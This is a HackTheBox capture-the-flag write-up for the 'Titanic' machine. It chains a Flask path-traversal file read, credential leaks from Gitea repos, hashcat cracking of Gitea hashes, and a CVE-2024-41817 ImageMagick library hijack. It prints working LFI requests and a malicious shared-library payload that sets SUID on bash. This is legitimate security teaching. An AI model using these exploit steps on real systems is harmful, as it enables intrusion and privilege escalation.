
# HackTheBox — Titanic | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Web / Linux
> **Date:** 2026-03-26

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [Local File Inclusion via Path Traversal](#local-file-inclusion-via-path-traversal)
4. [Gitea Enumeration & Credential Extraction](#gitea-enumeration--credential-extraction)
5. [Initial Access — SSH](#initial-access--ssh)
6. [Privilege Escalation — CVE-2024-41817](#privilege-escalation--cve-2024-41817)
7. [Attack Chain](#attack-chain)
8. [Tools Used](#tools-used)
9. [Vulnerabilities Exploited](#vulnerabilities-exploited)
10. [What Failed — Dead Ends](#what-failed--dead-ends)
11. [Key Takeaways](#key-takeaways)

---

## TL;DR

Titanic is an Easy Linux box centered around a Flask web application with an unsanitized file download endpoint. The `/download?ticket=` parameter is passed directly to Python's `os.path.join()` and Flask's `send_file()` with no path validation, enabling full filesystem read via path traversal. Reading the Apache vhost config exposes a Gitea 1.22.1 instance on a secondary vhost hosting two public repositories — one containing the Flask source code confirming the vulnerability, and another with Docker Compose files leaking database credentials in plaintext. The Gitea SQLite database is pulled directly via LFI, pbkdf2 hashes are extracted and cracked with hashcat, and SSH access is obtained via password reuse between a Docker environment variable and the system account. Privilege escalation abuses CVE-2024-41817 — ImageMagick 7.1.1-35 loads shared libraries from the current working directory, and a root-owned cron job executes `magick identify` after `cd`-ing into a user-writable directory. A malicious shared library with a constructor payload is placed in the writable directory, sets the SUID bit on `/bin/bash` when loaded by root, and `bash -p` gives a root shell.

---

## Recon

### Port Scan

```bash
nmap -sV -sC -T4 --open <TARGET>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
```

**Thought process:** Two ports — SSH is a dead end without credentials. HTTP is the entry point. The response header `Server: Werkzeug/3.0.3 Python/3.10.12` reveals Apache is a reverse proxy in front of a Flask application. Flask apps often expose dangerous file operations.

### Web Enumeration

The web application is a cruise booking site with a modal form that POSTs to `/book`. Manual endpoint probing revealed the most interesting route:

| Path | Status | Notes |
| --- | --- | --- |
| `/` | 200 | Flask booking landing page |
| `/book` | 405 | POST only — endpoint confirmed |
| `/download` | 400 | JSON error: ticket parameter missing |
| `/console` | 404 | Werkzeug debug mode disabled |

**Thought process:** A file download endpoint that returns a structured JSON error about a missing `ticket` parameter is immediately suspicious. User-controlled filename parameters feeding into file operations are the most common path traversal vector in Flask apps.

### Vhost Discovery

Reading the Apache vhost configuration (obtained via LFI) revealed a `RewriteRule` enforcing the primary domain — a strong indicator of additional vhosts:

```bash
for sub in dev admin git gitlab api test staging; do
  echo -n "$sub.<TARGET>: "
  curl -s -o /dev/null -w "%{http_code}" -H "Host: $sub.<TARGET>" http://<TARGET_IP>
  echo
done
```

```
dev.<TARGET>: 200   ← Gitea instance
```

**Key finding:** `dev.<TARGET>` responds 200 — a Gitea 1.22.1 instance. All other subdomains redirect back to the main host.

---

## Local File Inclusion via Path Traversal

### Discovery

The Flask source code (confirmed via the Gitea `flask-app` repository) shows the vulnerability clearly:

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)  # ← no sanitization

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

`os.path.join("tickets", "../../../etc/passwd")` resolves to `../../../etc/passwd`. Python's `os.path.join()` does not sanitize `../` traversal sequences — it simply concatenates them.

**Thought process:** Once the file download endpoint was identified, path traversal was the immediate test. Three `../` levels is sufficient to escape a typical Flask working directory to the filesystem root.

### Exploitation

```bash
# Confirm LFI — read /etc/passwd
curl "http://<TARGET>/download?ticket=../../../etc/passwd"

# Escalate — Apache vhost config reveals secondary vhost
curl "http://<TARGET>/download?ticket=../../../etc/apache2/sites-enabled/000-default.conf"

# Escalate — Gitea app.ini reveals SQLite database path
curl "http://<TARGET>/download?ticket=../../../home/<USER>/gitea/data/gitea/app.ini"
# [database]
# PATH = /data/gitea/gitea.db  (container → host: /home/<USER>/gitea/data/gitea/gitea.db)

# Pull the Gitea database directly
curl "http://<TARGET>/download?ticket=../../../home/<USER>/gitea/data/gitea/gitea.db" \
  -o gitea.db
```

**Key finding:** The Gitea data volume is mapped to the host at `/home/<USER>/gitea/data` — the SQLite database is fully readable via LFI. Only two users have login shells: a low-privilege user and root.

---

## Gitea Enumeration & Credential Extraction

### Public Repository Discovery

Gitea's explore endpoint requires no authentication:

```bash
curl -s "http://dev.<TARGET>/explore/repos"
```

Two public repositories found under the low-privilege user:

- `<user>/flask-app` — Flask source code confirming the LFI
- `<user>/docker-config` — Docker Compose infrastructure files

### Credential Leak

```bash
curl -H "Host: dev.<TARGET>" \
  "http://<TARGET_IP>/<user>/docker-config/raw/branch/main/mysql/docker-compose.yml"
```

The MySQL Docker Compose file contains plaintext credentials in environment variables. These credentials are worth testing immediately against SSH — Docker env var passwords are frequently reused as system account passwords.

**Thought process:** Public repos on internal Gitea instances almost always contain infrastructure configs with hardcoded credentials. Always enumerate `/explore/repos` before attempting authentication.

### Hash Extraction & Cracking

```bash
# Extract pbkdf2 hashes from the downloaded SQLite database
sqlite3 gitea.db "SELECT name, passwd, salt, passwd_hash_algo FROM user;"
# Two users: the low-privilege user and administrator

# Convert hex hashes to hashcat PBKDF2-HMAC-SHA256 format (mode 10900)
# Important: base64 must NOT have trailing '=' padding — hashcat will reject it
python3 << 'EOF'
import base64
users = [
    ("user", "PASSWD_HEX", "SALT_HEX"),
]
for n, p, s in users:
    salt_b64 = base64.b64encode(bytes.fromhex(s)).decode().rstrip("=")
    hash_b64 = base64.b64encode(bytes.fromhex(p)).decode().rstrip("=")
    print(f"sha256:50000:{salt_b64}:{hash_b64}")
EOF

hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The low-privilege user's password cracked successfully against rockyou. The administrator hash did not crack.

---

## Initial Access — SSH

SSH access obtained using the database credential from `docker-compose.yml` — password reused as the system account password:

```bash
ssh <USER>@<TARGET>
```

```
<USER>@titanic:~$ whoami
<USER>
<USER>@titanic:~$ ls
gitea  mysql  user.txt
```

**Thought process:** Always try leaked service/environment credentials directly against SSH before investing time in hash cracking. The cracked Gitea hash was tried first and failed — the Docker environment variable password succeeded.

Post-login enumeration:

```bash
sudo -l                          # No sudo rights
find / -perm -4000 2>/dev/null   # Standard Ubuntu SUIDs only
getcap -r / 2>/dev/null          # No useful capabilities
find /opt -type f 2>/dev/null    # Finds /opt/scripts/identify_images.sh
find /opt /srv /var/www -writable 2>/dev/null  # Finds writable images directory
```

---

## Privilege Escalation — CVE-2024-41817

### Discovery

```bash
cat /opt/scripts/identify_images.sh
```

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

```bash
magick -version
# Version: ImageMagick 7.1.1-35  ← vulnerable (< 7.1.1-36)

find /opt /srv /var/www -writable 2>/dev/null
# /opt/app/static/assets/images  ← writable by current user
```

**Thought process:** Three conditions align for CVE-2024-41817:
1. A root-owned script calls `magick identify`
2. The script `cd`s into a working directory first
3. That directory is writable by the current user

This is a textbook shared library hijack via ImageMagick's vulnerable cwd search order.

### The Vulnerability

CVE-2024-41817 affects ImageMagick versions before 7.1.1-36. When `magick` initializes, it searches for shared libraries — including `libxcb.so.1` — in the current working directory before checking standard system library paths. A shared library containing a `__attribute__((constructor))` function executes that function automatically at load time, before any `magick` code runs, with the full privileges of the calling process.

### Exploit Preparation

```bash
# Write the malicious constructor payload
cat > /tmp/pwn.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) pwn() {
    setuid(0);
    setgid(0);
    system("chmod u+s /bin/bash");
}
EOF

# Compile as a shared library and place in the writable working directory
# This is the exact directory the cron script cd's into before calling magick
gcc -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 /tmp/pwn.c
```

### Exploitation

```bash
# Monitor for SUID bit to appear on /bin/bash
watch -n 2 'ls -la /bin/bash | grep rws'
```

When the cron fires, magick loads `libxcb.so.1` from the working directory, the constructor runs as root, and `/bin/bash` becomes SUID.

### Root Access

```bash
bash -p
whoami   # root
cat /root/root.txt
```

**Why it works:** The `__attribute__((constructor))` function fires at shared library load time with the privileges of the calling process (root). `setuid(0)/setgid(0)` ensures the subsequent `system()` call also runs as root. The SUID bit on `/bin/bash` persists after the cron completes. `bash -p` preserves the elevated effective UID, giving an interactive root shell.

---

## Attack Chain

```
nmap → Port 22 (SSH), Port 80 (Apache → Flask)
│
└── Port 80 — Flask booking app (Werkzeug 3.0.3)
    ├── /download?ticket= → LFI (os.path.join + send_file, no sanitization)
    │   ├── /etc/passwd → login shell users identified
    │   ├── Apache config → dev.<TARGET> vhost discovered
    │   │   └── Gitea 1.22.1 — public repos (no auth)
    │   │       ├── flask-app → LFI source confirmed
    │   │       └── docker-config/mysql/docker-compose.yml
    │   │           └── database credentials leaked in plaintext
    │   └── /home/<USER>/gitea/data/gitea/gitea.db
    │       └── sqlite3 → pbkdf2 hashes extracted
    │           └── hashcat -m 10900 → user password cracked
    │
    └── SSH: <USER> (Docker env var password reuse) → user.txt ✅
        └── /opt/scripts/identify_images.sh (root cron)
            └── cd /opt/app/static/assets/images (user-writable)
                └── /usr/bin/magick identify *.jpg
                    └── CVE-2024-41817: libxcb.so.1 constructor hijack
                        └── chmod u+s /bin/bash
                            └── bash -p → root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `curl` | Web enumeration, LFI exploitation, Gitea raw API reads |
| `sqlite3` | Extract password hashes from Gitea SQLite database |
| `python3` | Convert hex hashes to hashcat PBKDF2-HMAC-SHA256 format |
| `hashcat -m 10900` | Crack PBKDF2-HMAC-SHA256 hashes |
| `gcc` | Compile malicious shared library |
| `bash -p` | Spawn root shell via SUID bash |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| Path traversal / LFI | Flask `/download?ticket=` — `os.path.join()` + `send_file()` unsanitized | Full filesystem read as app user |
| Exposed credentials in public repo | `docker-config` Gitea repo — `docker-compose.yml` | Plaintext database credentials |
| Weak pbkdf2 password | Gitea user account hash | Cracked with rockyou wordlist |
| Password reuse | Docker env var reused as SSH system password | Initial system foothold |
| CVE-2024-41817 | ImageMagick 7.1.1-35 — shared library cwd loading | Root via constructor hijack + cron |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| `/etc/shadow` via LFI | 500 error — Flask process has no permission to read shadow |
| Gitea `INTERNAL_TOKEN` as API bearer token | Token is for internal Gitea IPC, not user API auth → 401 |
| SSH private key via LFI | No SSH keys configured for the user account |
| SSH with cracked Gitea password | Wrong password — Docker env var password was correct (reuse) |
| `sudo -l` privilege escalation | No sudo rights for this user |

---

## Key Takeaways

**1. `os.path.join()` does not sanitize path traversal — never use it with raw user input**
Python's `os.path.join("dir", "../../../etc/passwd")` resolves to `../../../etc/passwd`. The fix is `os.path.basename(ticket)` to strip all path components, or validating the input against a UUID allowlist before any file operation.

**2. Internal Gitea public repos are high-value targets — enumerate before authenticating**
`/explore/repos` requires no authentication. Internal Gitea instances frequently host infrastructure configs, deployment scripts, and Docker Compose files with hardcoded credentials. This should be the first action after discovering a Gitea instance.

**3. LFI is a full architecture enumeration tool, not just /etc/passwd**
Apache/nginx configs reveal vhosts and internal proxies. Service configs (`app.ini`) reveal database paths and secret keys. Docker Compose files reveal credentials. The LFI escalation chain here went: `/etc/passwd` → Apache config → Gitea app.ini → Gitea SQLite DB → password hashes → cracked credentials.

**4. Docker environment variable passwords are commonly reused as system account passwords**
`MYSQL_ROOT_PASSWORD` and similar environment variables are often set to the developer's system password. Always test every leaked credential against SSH immediately — before investing time in hash cracking.

**5. CVE-2024-41817 — three conditions that mean instant root**
Check for: (1) root process runs `magick`, (2) `cd` into working directory first, (3) that directory is user-writable. If all three — place `libxcb.so.1` with a constructor payload and wait for the next cron cycle. Confirm version: vulnerable if `< 7.1.1-36`.

---

*Written by k41r0s3 | HackTheBox | Titanic | Easy*
